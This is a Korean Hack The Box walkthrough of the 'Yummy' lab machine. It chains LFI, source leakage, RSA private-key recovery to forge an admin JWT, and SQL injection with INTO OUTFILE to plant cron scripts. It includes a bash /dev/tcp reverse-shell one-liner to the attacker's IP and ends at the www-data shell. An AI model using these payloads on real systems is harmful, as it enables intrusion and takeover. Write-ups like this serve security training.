---
title: "Yummy (Hard)"
date: 2025-10-21
layout: single
excerpt: "Yummy는 Hard 난이도의 박스로, Caddy 웹 서버가 포트 80에서 구동되는 레스토랑 웹 애플리케이션에서 시작되며, 공격자는 Caddy의 기본 설정에서 적절히 필터링되지 않는 HTTP Location 헤더를 이용해 임의 파일 읽기 취약점을 발견하고, 소스 코드를 열람한 뒤 JWT RSA 키 쌍을 통해 관리자 토큰을 위조하여 권한을 상승시킨다; 이후 관리자 패널에서 SQL 인젝션을 통해 임의 파일 쓰기가 가능해지면서 주기적으로 실행되는 cronjob 파일을 덮어쓰고, 디렉터리 권한 설정이 허술한 점을 이용해 www-data 사용자에서 dev 사용자로 이동한 뒤, 루트 권한으로 실행 가능한 rsync 바이너리를 활용해 최종적으로 루트 권한을 탈취하게 된다."
author_profile: true
toc: true
toc_label: "Yummy"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/htb-linux/yummy/yummy.png
  teaser_home_page: true
categories: [hackthebox linux]
tags: [htb, hard, web, jwt, sqli, priv-esc]
---

![Yummy](/assets/htb-linux/yummy/yummy.png)

Yummy는 Hard 난이도의 박스로, `Caddy` 웹 서버가 포트 80에서 구동되는 레스토랑 웹 애플리케이션에서 시작되며, 공격자는 `Caddy`의 기본 설정에서 적절히 필터링되지 않는 HTTP `Location` 헤더를 이용해 임의 파일 읽기 취약점을 발견하고, 소스 코드를 열람한 뒤 `JWT RSA` 키 쌍을 통해 관리자 토큰을 위조하여 권한을 상승시킨다.

이후 관리자 패널에서 SQL 인젝션을 통해 임의 파일 쓰기가 가능해지면서 주기적으로 실행되는 `cronjob` 파일을 덮어쓰고, 디렉터리 권한 설정이 허술한 점을 이용해 `www-data` 사용자에서 `dev` 사용자로 이동한 뒤, 루트 권한으로 실행 가능한 `rsync` 바이너리를 활용해 최종적으로 루트 권한을 탈취하게 된다.



# Enumeration

## Portscan

먼저 대상 Host(`10.10.11.36`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다.

```bash
$ nmap -sC -sV 10.10.11.36 | tee nmap
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 15:27 EDT
Nmap scan report for yummy.htb (10.10.11.36)
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a2:ed:65:77:e9:c4:2f:13:49:19:b0:b8:09:eb:56:36 (ECDSA)
|_  256 bc:df:25:35:5c:97:24:f2:69:b4:ce:60:17:50:3c:f0 (ED25519)
80/tcp open  http    Caddy httpd
|_http-server-header: Caddy
|_http-title: Yummy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.85 seconds
```

Nmap 스캔 결과, `SSH(22)`, `HTTP(80)`(Caddy httpd) 서비스가 열려 있고, 웹은 **yummy.htb** 도메인으로 접근해야 함을 확인했다.

## 도메인 이름 설정 (/etc/hosts)

웹 서비스 접근을 위해 `/etc/hosts` 파일에 **10.10.11.36 yummy.htb**를 추가하였다.

```bash
$ cat /etc/hosts | grep htb

10.10.11.36     yummy.htb
```

---

# Vulnerability Analysis

대상 웹 애플리케이션은 레스토랑 예약 기능을 제공하는 웹사이트로 보인다.

![웹사이트](/assets/htb-linux/yummy/website.png)

회원가입을 통해 계정을 생성한 뒤 로그인하면 `Dashboard` 페이지로 접근이 가능하다.

![Dashboard](/assets/htb-linux/yummy/dashboard.png)

위 사진에 보이는 `BOOK A TABLE`을 클릭하면 테이블을 예약할 수 있다. 예약을 하면 아래와 같이 Dashboard 페이지에 예약 내역이 표시된다.

![예약](/assets/htb-linux/yummy/reservation.png)

`Save iCalendar` 기능을 통해 예약 내역을 저장하면 `*.ics` 파일이 생성되는 것을 확인할 수 있다.

![ics 파일 생성](/assets/htb-linux/yummy/ics_file.png)

## LFI

Burp Suite를 실행한 후 `Save iCalendar` 기능으로 예약을 저장하면 `/export` 경로의 `*.ics` 파일과 함께 `/reminder/21` 경로가 생성된다. 이 `/reminder/21` 을 먼저 호출해 활성화해야만 `/export/*.ics` 경로가 동작한다.

![두개의 경로](/assets/htb-linux/yummy/export.png)

`/reminder/21` 경로는 `.ics` 파일과 관련된 저장소 엔드포인트로 추정된다.

우선 `/reminder/21` 을 활성화한 후,

![활성화](/assets/htb-linux/yummy/reminder.png)

`/export/*.ics` 경로를 요청하면 아래와 같이 `.ics` 파일의 정보를 읽을 수 있다.

![경로 요청](/assets/htb-linux/yummy/ics_file2.png)

위 매커니즘을 토대로 `/export` 경로에 `/etc/passwd` 를 넣어 요청한 결과 LFI 취약점이 존재함을 확인하였다.

![LFI 취약점 확인](/assets/htb-linux/yummy/lfi.png)

## Crontab

이후 `/etc/crontab` 을 확인한 결과, 다음 세 개의 스크립트가 cron에 등록되어 있었다:

- `/data/scripts/app_backup.sh`
- `/data/scripts/table_cleanup.sh`
- `/data/scripts/dbmonitor.sh`

![crontab](/assets/htb-linux/yummy/crontab.png)

## Per‑script analysis

`/data/scripts/app_backup.sh`는 `/var/www`로 이동한 뒤 `/opt/app`을 압축하여 `backupapp.zip`을 생성하는 백업 스크립트로 보인다:

```bash
#!/bin/bash

cd /var/www
/usr/bin/rm backupapp.zip
/usr/bin/zip -r backupapp.zip /opt/app
```

`/data/scripts/table_cleanup.sh` 는 15분 간격으로 MySQL 데이터베이스에 `/data/scripts/sqlappointments.sql` 를 적용하는 스크립트로, MySQL 접속 정보가 스크립트에 포함되어 있다:

```bash
#!/bin/sh

/usr/bin/mysql -h localhost -u chef yummy_db -p'3wDo7gSRZIwIHRxZ!' < /data/scripts/sqlappointments.sql
```

`/data/scripts/dbmonitor.sh` 는 MySQL 서비스 상태를 확인하고, 데이터베이스가 정상 동작하지 않거나 `/data/scripts/dbstatus.json` 에 내용이 존재할 경우 `/data/scripts/fixer-v*` 패턴에 매칭되는 파일 목록 중 버전 정렬 후 최신 파일을 선택하여 **/bin/bash "$latest_version"** 를 실행한다.

이 동작 방식으로 인해 `/data/scripts` 에 쓰기 권한이 있는 공격자가 `fixer-v*` 이름으로 악성 스크립트를 업로드할 경우, cron이 이를 실행하여 **임의 코드 실행(RCE)**으로 이어질 수 있다:

```bash
#!/bin/bash

timestamp=$(/usr/bin/date)
service=mysql
response=$(/usr/bin/systemctl is-active mysql)

if [ "$response" != 'active' ]; then
    /usr/bin/echo "{\"status\": \"The database is down\", \"time\": \"$timestamp\"}" > /data/scripts/dbstatus.json
    /usr/bin/echo "$service is down, restarting!!!" | /usr/bin/mail -s "$service is down!!!" root
    latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
    /bin/bash "$latest_version"
else
    if [ -f /data/scripts/dbstatus.json ]; then
        if grep -q "database is down" /data/scripts/dbstatus.json 2>/dev/null; then
            /usr/bin/echo "The database was down at $timestamp. Sending notification."
            /usr/bin/echo "$service was down at $timestamp but came back up." | /usr/bin/mail -s "$service was down!" root
            /usr/bin/rm -f /data/scripts/dbstatus.json
        else
            /usr/bin/rm -f /data/scripts/dbstatus.json
            /usr/bin/echo "The automation failed in some way, attempting to fix it."
            latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
            /bin/bash "$latest_version"
        fi
    else
        /usr/bin/echo "Response is OK."
    fi
fi

[ -f dbstatus.json ] && /usr/bin/rm -f dbstatus.json
```

## Source Leak

이제 LFI 취약점을 이용해 현재 실행 중인 `app.py` 파일의 소스코드를 확인하기 위해 `/proc/self/cwd` 경로를 사용하였다.

`/proc/self/cwd`는 현재 실행 중인 프로세스의 작업 디렉터리를 가리키는 심볼릭 링크이며, Flask 서버가 `app.py` 파일이 있는 디렉터리에서 직접 실행된 경우, 해당 경로는 `/var/www`가 아닌 `/proc/self/cwd`를 통해 접근할 수 있게 된다.

<details style="border: 1px solid #ccc; padding: 0.5em; border-radius: 5px;">  
    <summary style="font-weight: bold; cursor: pointer;">app.py 코드는 다음과 같다:</summary>
    <br>
    <div markdown="1">

```python
from flask import Flask, request, send_file, render_template, redirect, url_for, flash, jsonify, make_response
import tempfile
import os
import shutil
from datetime import datetime, timedelta, timezone
from urllib.parse import quote
from ics import Calendar, Event
from middleware.verification import verify_token
from config import signature
import pymysql.cursors
from pymysql.constants import CLIENT
import jwt
import secrets
import hashlib

app = Flask(__name__, static_url_path='/static')
temp_dir = ''
app.secret_key = secrets.token_hex(32)

db_config = {
    'host': '127.0.0.1',
    'user': 'chef',
    'password': '3wDo7gSRZIwIHRxZ!',
    'database': 'yummy_db',
    'cursorclass': pymysql.cursors.DictCursor,
    'client_flag': CLIENT.MULTI_STATEMENTS

}

access_token = ''

@app.route('/login', methods=['GET','POST'])
def login():
    global access_token
    if request.method == 'GET':
        return render_template('login.html', message=None)
    elif request.method == 'POST':
        email = request.json.get('email')
        password = request.json.get('password')
        password2 = hashlib.sha256(password.encode()).hexdigest()
        if not email or not password:
            return jsonify(message="email or password is missing"), 400

        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "SELECT * FROM users WHERE email=%s AND password=%s"
                cursor.execute(sql, (email, password2))
                user = cursor.fetchone()
                if user:
                    payload = {
                        'email': email,
                        'role': user['role_id'],
                        'iat': datetime.now(timezone.utc),
                        'exp': datetime.now(timezone.utc) + timedelta(seconds=3600),
                        'jwk':{'kty': 'RSA',"n":str(signature.n),"e":signature.e}
                    }
                    access_token = jwt.encode(payload, signature.key.export_key(), algorithm='RS256')

                    response = make_response(jsonify(access_token=access_token), 200)
                    response.set_cookie('X-AUTH-Token', access_token)
                    return response
                else:
                    return jsonify(message="Invalid email or password"), 401
        finally:
            connection.close()

@app.route('/logout', methods=['GET'])
def logout():
    response = make_response(redirect('/login'))
    response.set_cookie('X-AUTH-Token', '')
    return response

@app.route('/register', methods=['GET', 'POST'])
def register():
        if request.method == 'GET':
            return render_template('register.html', message=None)
        elif request.method == 'POST':
            role_id = 'customer_' + secrets.token_hex(4)
            email = request.json.get('email')
            password = hashlib.sha256(request.json.get('password').encode()).hexdigest()
            if not email or not password:
                return jsonify(error="email or password is missing"), 400
            connection = pymysql.connect(**db_config)
            try:
                with connection.cursor() as cursor:
                    sql = "SELECT * FROM users WHERE email=%s"
                    cursor.execute(sql, (email,))
                    existing_user = cursor.fetchone()
                    if existing_user:
                        return jsonify(error="Email already exists"), 400
                    else:
                        sql = "INSERT INTO users (email, password, role_id) VALUES (%s, %s, %s)"
                        cursor.execute(sql, (email, password, role_id))
                        connection.commit()
                        return jsonify(message="User registered successfully"), 201
            finally:
                connection.close()


@app.route('/', methods=['GET', 'POST'])
def index():
    return render_template('index.html')

@app.route('/book', methods=['GET', 'POST'])
def export():
    if request.method == 'POST':
        try:
            name = request.form['name']
            date = request.form['date']
            time = request.form['time']
            email = request.form['email']
            num_people = request.form['people']
            message = request.form['message']

            connection = pymysql.connect(**db_config)
            try:
                with connection.cursor() as cursor:
                    sql = "INSERT INTO appointments (appointment_name, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message, role_id) VALUES (%s, %s, %s, %s, %s, %s, %s)"
                    cursor.execute(sql, (name, email, date, time, num_people, message, 'customer'))
                    connection.commit()
                    flash('Your booking request was sent. You can manage your appointment further from your account. Thank you!', 'success')  
            except Exception as e:
                print(e)
            return redirect('/#book-a-table')
        except ValueError:
            flash('Error processing your request. Please try again.', 'error')
    return render_template('index.html')


def generate_ics_file(name, date, time, email, num_people, message):
    global temp_dir
    temp_dir = tempfile.mkdtemp()
    current_date_time = datetime.now()
    formatted_date_time = current_date_time.strftime("%Y%m%d_%H%M%S")

    cal = Calendar()
    event = Event()
    
    event.name = name
    event.begin = datetime.strptime(date, "%Y-%m-%d")
    event.description = f"Email: {email}\nNumber of People: {num_people}\nMessage: {message}"
    
    cal.events.add(event)

    temp_file_path = os.path.join(temp_dir, quote('Yummy_reservation_' + formatted_date_time + '.ics'))
    with open(temp_file_path, 'w') as fp:
        fp.write(cal.serialize())

    return os.path.basename(temp_file_path)

@app.route('/export/<path:filename>')
def export_file(filename):
    validation = validate_login()
    if validation is None:
        return redirect(url_for('login'))
    filepath = os.path.join(temp_dir, filename)
    if os.path.exists(filepath):
        content = send_file(filepath, as_attachment=True)
        shutil.rmtree(temp_dir)
        return content
    else:
        shutil.rmtree(temp_dir)
        return "File not found", 404

def validate_login():
    try:
        (email, current_role), status_code = verify_token()
        if email and status_code == 200 and current_role == "administrator":
            return current_role
        elif email and status_code == 200:
            return email
        else:
            raise Exception("Invalid token")
    except Exception as e:
        return None


@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
        validation = validate_login()
        if validation is None:
            return redirect(url_for('login'))
        elif validation == "administrator":
            return redirect(url_for('admindashboard'))
 
        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "SELECT appointment_id, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s"
                cursor.execute(sql, (validation,))
                connection.commit()
                appointments = cursor.fetchall()
                appointments_sorted = sorted(appointments, key=lambda x: x['appointment_id'])

        finally:
            connection.close()

        return render_template('dashboard.html', appointments=appointments_sorted)

@app.route('/delete/<appointID>')
def delete_file(appointID):
    validation = validate_login()
    if validation is None:
        return redirect(url_for('login'))
    elif validation == "administrator":
        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "DELETE FROM appointments where appointment_id= %s;"
                cursor.execute(sql, (appointID,))
                connection.commit()

                sql = "SELECT * from appointments"
                cursor.execute(sql)
                connection.commit()
                appointments = cursor.fetchall()
        finally:
            connection.close()
            flash("Reservation deleted successfully","success")
            return redirect(url_for("admindashboard"))
    else:
        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "DELETE FROM appointments WHERE appointment_id = %s AND appointment_email = %s;"
                cursor.execute(sql, (appointID, validation))
                connection.commit()

                sql = "SELECT appointment_id, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s"
                cursor.execute(sql, (validation,))
                connection.commit()
                appointments = cursor.fetchall()
        finally:
            connection.close()
            flash("Reservation deleted successfully","success")
            return redirect(url_for("dashboard"))
        flash("Something went wrong!","error")
        return redirect(url_for("dashboard"))

@app.route('/reminder/<appointID>')
def reminder_file(appointID):
    validation = validate_login()
    if validation is None:
        return redirect(url_for('login'))

    connection = pymysql.connect(**db_config)
    try:
        with connection.cursor() as cursor:
            sql = "SELECT appointment_id, appointment_name, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s AND appointment_id = %s"
            result = cursor.execute(sql, (validation, appointID))
            if result != 0:
                connection.commit()
                appointments = cursor.fetchone()
                filename = generate_ics_file(appointments['appointment_name'], appointments['appointment_date'], appointments['appointment_time'], appointments['appointment_email'], appointments['appointment_people'], appointments['appointment_message'])
                connection.close()
                flash("Reservation downloaded successfully","success")
                return redirect(url_for('export_file', filename=filename))
            else:
                flash("Something went wrong!","error")
    except:
        flash("Something went wrong!","error")
        
    return redirect(url_for("dashboard"))

@app.route('/admindashboard', methods=['GET', 'POST'])
def admindashboard():
        validation = validate_login()
        if validation != "administrator":
            return redirect(url_for('login'))
 
        try:
            connection = pymysql.connect(**db_config)
            with connection.cursor() as cursor:
                sql = "SELECT * from appointments"
                cursor.execute(sql)
                connection.commit()
                appointments = cursor.fetchall()

                search_query = request.args.get('s', '')

                # added option to order the reservations
                order_query = request.args.get('o', '')

                sql = f"SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}"
                cursor.execute(sql, ('%' + search_query + '%',))
                connection.commit()
                appointments = cursor.fetchall()
            connection.close()
            
            return render_template('admindashboard.html', appointments=appointments)
        except Exception as e:
            flash(str(e), 'error')
            return render_template('admindashboard.html', appointments=appointments)

if __name__ == '__main__':
    app.run(threaded=True, debug=False, host='0.0.0.0', port=3000)
```
</div>
</details>
<br>

`app.py` 코드를 살펴본 결과, 사용자의 인증 상태를 확인하기 위해 `validate_login()` 함수를 사용하고 있으며, 이 함수는 JWT 토큰의 유효성을 검증하기 위해 `middleware/verification.py` 내의 `verify_token()` 함수를 내부적으로 호출한다:


```python
from middleware.verification import verify_token

def validate_login():
    try:
        (email, current_role), status_code = verify_token()
        if email and status_code == 200 and current_role == "administrator":
            return current_role
        elif email and status_code == 200:
            return email
        else:
            raise Exception("Invalid token")
    except Exception as e:
        return None
```

이후 `middleware/verification.py` 경로의 소스코드를 보면 `verify_token()` 함수는 JWT 토큰을 검증하여 사용자 정보를 반환한다:

```python
#!/usr/bin/python3

from flask import request, jsonify
import jwt
from config import signature

def verify_token():
    token = None
    if "Cookie" in request.headers:
        try:
            token = request.headers["Cookie"].split(" ")[0].split("X-AUTH-Token=")[1].replace(";", '')
        except:
            return jsonify(message="Authentication Token is missing"), 401

    if not token:
        return jsonify(message="Authentication Token is missing"), 401

    try:
        data = jwt.decode(token, signature.public_key, algorithms=["RS256"])
        current_role = data.get("role")
        email = data.get("email")
        if current_role is None or ("customer" not in current_role and "administrator" not in current_role):
            return jsonify(message="Invalid Authentication token"), 401

        return (email, current_role), 200

    except jwt.ExpiredSignatureError:
        return jsonify(message="Token has expired"), 401
    except jwt.InvalidTokenError:
        return jsonify(message="Invalid token"), 401
    except Exception as e:
        return jsonify(error=str(e)), 500
```

이제 `app.py`의 `/dashboard` 부분을 보면 사용자가 `administrator` 일 경우 `/admindashboard` 로 리다이렉트가 되는 것을 확인하였다. 이는 사용자 역할에 따라 접근 경로를 분기하는 구조이다:

```python
@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
        validation = validate_login()
        if validation is None:
            return redirect(url_for('login'))
        elif validation == "administrator":
            return redirect(url_for('admindashboard'))
```

그리고 `app.py` 의 `/login` 부분을 보면 POST 요청 시, 입력된 사용자 정보를 바탕으로 인증을 수행하고 **JWT 토큰을 발급**한다:

```python
from config import signature

@app.route('/login', methods=['GET','POST'])
def login():
    global access_token
    if request.method == 'GET':
        return render_template('login.html', message=None)
    elif request.method == 'POST':
        email = request.json.get('email')
        password = request.json.get('password')
        password2 = hashlib.sha256(password.encode()).hexdigest()
        if not email or not password:
            return jsonify(message="email or password is missing"), 400

        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "SELECT * FROM users WHERE email=%s AND password=%s"
                cursor.execute(sql, (email, password2))
                user = cursor.fetchone()
                if user:
                    payload = {
                        'email': email,
                        'role': user['role_id'],
                        'iat': datetime.now(timezone.utc),
                        'exp': datetime.now(timezone.utc) + timedelta(seconds=3600),
                        'jwk':{'kty': 'RSA',"n":str(signature.n),"e":signature.e}
                    }
                    access_token = jwt.encode(payload, signature.key.export_key(), algorithm='RS256')

                    response = make_response(jsonify(access_token=access_token), 200)
                    response.set_cookie('X-AUTH-Token', access_token)
                    return response
                else:
                    return jsonify(message="Invalid email or password"), 401
        finally:
            connection.close()
```

위 `login` 코드에서 import된 `signature` 모듈의 내용을 파악하기 위해 `config/signature.py` 경로에 접근하여 분석을 진행하였다:

```python
#!/usr/bin/python3

from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy


# Generate RSA key pair
q = sympy.randprime(2**19, 2**20)
n = sympy.randprime(2**1023, 2**1024) * q
e = 65537
p = n // q
phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)
key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
private_key_bytes = key.export_key()

private_key = serialization.load_pem_private_key(
    private_key_bytes,
    password=None,
    backend=default_backend()
)
public_key = private_key.public_key()
```

위 코드는 **q를 2^19에서 2^20 사이의 소수**로 선택하고, **p는 암시적으로 n = q × p 관계를 통해 2^1023에서 2^1024 사이의 값**으로 정의하여 RSA 키를 생성하고 있다.

이로 인해 공개키의 `n` 값을 기반으로 작은 소수 범위에 대해 브루트포스를 수행하면 `q` 를 쉽게 찾아낼 수 있으며, 이를 통해 `p` 와 비밀키 `d` 를 계산하여 전체 RSA 키를 복원할 수 있다.

따라서 공격자가 유효한 JWT 토큰을 임의로 생성하여 `role` 값을 `administrator`로 설정할 수 있다면, 관리자 페이지인 `/admindashboard`에 접근할 수 있게 된다.

## Public/Private Key Extraction

로그인 후 발급된 JWT 토큰(`X-AUTH-Token`)을 디코딩해 보면 다음과 같은 `jwk` 파라미터가 포함되어 있었다:

```json
{"alg":"RS256","typ":"JWT"}.{"email":"jisang@yummy.htb","role":"customer_8fe553f3","iat":1761140958,"exp":1761144558,"jwk":{"kty":"RSA","n":"74673160055974198394374648750494733531187433261686368072961967683865729763806771135880124949338880430638226676057370360458718182598064526231863183835134418882564304809538136334372378677962267138168239639972921360392840763064283917300794216189900154911920553375224732175625003972948665562340679658640520314769846219","e":65537}}.
```

JWT에 포함된 공개키(`n`, `e`)는 앞서 분석한 `signature.py` 의 로직에 따라 생성된 것이며, q 값이 작은 범위(2^19 ~ 2^20) 내에서 선택되기 때문에 [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) 을 통해 비밀키 복원이 가능하다.

이후 RsaCtfTool을 이용해 공개된 `n`, `e` 값을 기반으로 비밀키 복원에 성공하였다:

```bash
$ RsaCtfTool --private -n 74673160055974198394374648750494733531187433261686368072961967683865729763806771135880124949338880430638226676057370360458718182598064526231863183835134418882564304809538136334372378677962267138168239639972921360392840763064283917300794216189900154911920553375224732175625003972948665562340679658640520314769846219 -e 65537  
['/tmp/tmpbzldbm3s']

[*] Testing key /tmp/tmpbzldbm3s.
attack initialized...
attack initialized...
[*] Performing system_primes_gcd attack on /tmp/tmpbzldbm3s.
100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 7007/7007 [00:00<00:00, 1065840.58it/s]
[+] Time elapsed: 0.0343 sec.
[*] Performing smallq attack on /tmp/tmpbzldbm3s.
[*] Attack success with smallq method !
[+] Total time elapsed min,max,avg: 0.0343/0.0343/0.0343 sec.

Results for /tmp/tmpbzldbm3s:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIICqAIBAAKBgwZWlz2tstnGLcu274t3EsR/MBWE+IFbeLYHYNn9q5LTtGiIp/RX
fRBksfWB5sm1Qn45Os3xajNBW+pBY5pS/3mbmuXei2bF6dOjdrxNLRNvmtEXnD15
dqjolDMqPYSzPtn/fHmtLxOlY8faMdZUByTuVuPxDAtITi35XPoW54JGry/LAgMB
AAECgYMEoERIpcT/hcnHLwp6C5gDRA7RIAys9faWxrMbmFGLwVclTlyzq2bw7prn
woyUhyHyRlXuqVB6fE6NspPTdVf+GhSNRxPX6xYJ7fQSXGqNAN/T/7lsgTaHwkKQ
aalFZWAs3zZYRL5Zid8PQhsq8/AE6Aw/cEwlqYe0jqKOMpHCizXbGQKBgQCDqmzV
uU5LAEZ9/m9Cwn5ZnPAWLPiHHg4f8wj90ucHbN0DeJ6EbnU+l13LJjXOhzIjwUM3
uFETy+1MNidjNEQb1cWkNWOziZ0mcxLgOIi3llOFnCu2EJKECCULJ2KcqvpMEnCG
NtIP9VOpR8AsPyyr7NT5AdsMQqLdFikfjHCIHwIDDFLVAoGAIHW6oTIvECSAPH2m
tmG2vqcHNaBeoQkS2GOVWuZM2LLJBhsNkX6d3xF4KSZBa6o+/TufM7R4IJZM6VYM
fdOb2vTn5eTXsKKDoMAL7kVhx0kDTFRFHnyVcoGDiG1sTU2FqY1+Okh3n0GPH5O1
1/K3M6eOldkURMCE4FafSszXzWcCAwXJsQKBgDzyJ5gClNZcJM4LCc8S7/CSJaeI
IboLmR+ulZRfv6xjQFh53TPdmm7LfsodxhLvZXbfg0UUf7S6MiPKECP0JRimcERf
9HbIxDP6Gmm/FmNxvyKioQj0/fnhd75S26SiHX4XWFPYN+WvVM43qv10Mm5LUkly
Du5HPZj7sPYBVA+z
-----END RSA PRIVATE KEY-----                             

$ RsaCtfTool --createpub -n 74673160055974198394374648750494733531187433261686368072961967683865729763806771135880124949338880430638226676057370360458718182598064526231863183835134418882564304809538136334372378677962267138168239639972921360392840763064283917300794216189900154911920553375224732175625003972948665562340679658640520314769846219 -e 65537
private argument is not set, the private key will not be displayed, even if recovered.
-----BEGIN PUBLIC KEY-----
MIGhMA0GCSqGSIb3DQEBAQUAA4GPADCBiwKBgwZWlz2tstnGLcu274t3EsR/MBWE
+IFbeLYHYNn9q5LTtGiIp/RXfRBksfWB5sm1Qn45Os3xajNBW+pBY5pS/3mbmuXe
i2bF6dOjdrxNLRNvmtEXnD15dqjolDMqPYSzPtn/fHmtLxOlY8faMdZUByTuVuPx
DAtITi35XPoW54JGry/LAgMBAAE=
-----END PUBLIC KEY-----
```

복원된 비밀키를 이용해 [Online JWT tool](https://dinochiesa.github.io/jwt/)에서 `role` 값을 `administrator` 로 설정한 새로운 JWT Token을 생성하였다.

![jwt](/assets/htb-linux/yummy/jwt.png)

## Access Admin Dashboard

해당 Token을 브라우저의 쿠키에 삽입한 결과, `/admindashboard` 경로에 정상적으로 접근할 수 있었다.

![AdminDashboard](/assets/htb-linux/yummy/admindashboard.png)

## SQL Injection

`app.py`의 `/admindashboard` 경로에 정의된 코드를 분석한 결과, 사용자의 입력을 필터링 없이 SQL 쿼리에 직접 삽입하는 구문이 존재하여 SQL Injection 취약점이 발생할 수 있음을 확인하였다:

```python
@app.route('/admindashboard', methods=['GET', 'POST'])
def admindashboard():
        validation = validate_login()
        if validation != "administrator":
            return redirect(url_for('login'))
 
        try:
            connection = pymysql.connect(**db_config)
            with connection.cursor() as cursor:
                sql = "SELECT * from appointments"
                cursor.execute(sql)
                connection.commit()
                appointments = cursor.fetchall()

                search_query = request.args.get('s', '')

                # added option to order the reservations
                order_query = request.args.get('o', '')

                sql = f"SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}"
                cursor.execute(sql, ('%' + search_query + '%',))
                connection.commit()
                appointments = cursor.fetchall()
            connection.close()
            
            return render_template('admindashboard.html', appointments=appointments)
        except Exception as e:
            flash(str(e), 'error')
            return render_template('admindashboard.html', appointments=appointments)
```

위와 같이 `order_query` 값은 사용자 입력을 그대로 `f-string` 을 통해 SQL 쿼리에 삽입하고 있으며, `order_query`에 `ASC; SELECT ~` 같은 악의적인 값이 들어갈 경우 다중 쿼리 실행이나 테이블 삭제 등의 공격이 가능하다.

---

# Exploitation

## SQLI Cron RCE

이전에 LFI를 통해 `/etc/crontab` 에서 확인한 주기적 실행 스크립트 `/data/scripts/dbmonitor.sh` 의 구조를 바탕으로, `MySQL` 의 `SELECT .. INTO OUTFILE` 구문을 활용하여 악성 스크립트를 `/data/scripts/` 경로에 작성했다.

먼저, 다음 쿼리를 통해 `dbstatus.json` 파일을 생성함으로써 **크론 스크립트의 else 블록으로 진입**하도록 유도하였다:

```sql
o=ASC; select 'test' INTO OUTFILE '/data/scripts/dbstatus.json';
```

이후, 공격자가 컨트롤할 수 있는 경로 `/data/scripts/fixer-v*` 내에 리버스 셸을 포함한 스크립트를 생성하였다:

![로그인 페이지 탐색](/assets/htb-linux/yummy/revshell.png)

잠시 후 크론에 의해 해당 스크립트가 실행되면서 **MySQL 권한으로 셸 접근**이 가능해졌다.

![로그인 페이지 탐색](/assets/htb-linux/yummy/mysql-shell.png)

---

# Privilege Escalation

## mysql → www-data Lateral Movement

MySQL 셸을 획득한 뒤, 아래 명령어를 통해 인터랙티브 셸로 업그레이드하였다.

```bash
mysql@yummy:/var/spool/cron$ script /dev/null -c bash

Script started, output log file is '/dev/null'.
```

이후 `/var/www` 경로로 이동해 `ls -al` 명령어로 디렉터리 권한을 확인한 결과, `app-qatesting` 디렉터리는 `www-data` 또는 `qa` 그룹에 속하지 않는 이상 접근이 불가능하였다.

```bash
mysql@yummy:/var/www$ ls -al

total 6664
drwxr-xr-x  3 www-data www-data    4096 Oct 23 05:03 .
drwxr-xr-x 14 root     root        4096 May 27  2024 ..
drwxrwx---  7 www-data qa          4096 May 28  2024 app-qatesting
-rw-rw-r--  1 www-data www-data 6807760 Oct 23 05:03 backupapp.zip
lrwxrwxrwx  1 root     root           9 May 27  2024 .bash_history -> /dev/null
```

### Exploiting the Crontab Backup Script

이전에 **LFI를 통해 확인된 `/etc/crontab`**에 따르면, `/data/scripts/app_backup.sh`는 **매 1분마다 `www-data` 권한**으로 실행된다. 

해당 스크립트는 `/opt/app` 디렉토리를 압축하여 `/var/www/backupapp.zip` 파일로 저장하는 역할을 한다:

```bash
#!/bin/bash

cd /var/www
/usr/bin/rm backupapp.zip
/usr/bin/zip -r backupapp.zip /opt/app
``` 

위 `/data/scripts/app_backup.sh` 경로에 있는 파일을 제거 후 새로운 `app_backup.sh` 리버스 셸 파일을 만들어 사용하면 `www-data` 권한으로 `cron` 에 의해 자동 실행되므로, 작성한 리버스 셸 코드가 실행되어 `www-data` 권한의 셸을 획득할 수 있는 가능성이 있다.

`/data/scripts` 경로로 이동 후 `app_backup.sh` 파일을 삭제 하였다:

```bash
mysql@yummy:/data/scripts$ rm -rf app_backup.sh
```

다른 터미널에선 리버스 셸을 대기 시킨 후

```bash
$ nc -lvnp 9002
```

그 다음 `app_backup.sh` 파일의 이름으로 리버스 셸 페이로드를 삽입하였다:

```bash
mysql@yummy:/data/scripts$ printf '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.9/9002 0>&1' | tee app_backup.sh
```

이후 크론이 동작되어 `www-data`의 셸을 획득하는데 성공 하였다.

